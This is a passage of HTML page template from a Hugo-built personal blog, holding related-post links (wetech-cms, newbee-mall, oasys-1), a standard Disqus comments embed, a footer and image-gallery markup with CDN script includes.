data-hash="md5-Np3mXMIjPImP5n+SiDwYZA=="></div><div class=article-details><h2 class=article-title>wetech-cms</h2></div></a></article><article class=has-image><a href=/p/newbee-mall/><div class=article-image><img src=/p/newbee-mall/cover.d0d72115f3faccc22a7ff7c0c38ca3ca_hu6190031081276942614.png width=250 height=150 loading=lazy alt="Featured image of post newbee-mall" data-hash="md5-0NchFfP6zMIqf/fAw4yjyg=="></div><div class=article-details><h2 class=article-title>newbee-mall</h2></div></a></article><article class=has-image><a href=/p/oasys-1/><div class=article-image><img src=/p/oasys-1/cover.983a250cc2b2a88f295e7c7b55c781be_hu10225888204114563353.png width=250 height=150 loading=lazy alt="Featured image of post oasys-1" data-hash="md5-mDolDMKyqI8pXnx7VceBvg=="></div><div class=article-details><h2 class=article-title>oasys-1</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2024 hadagaga blog</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
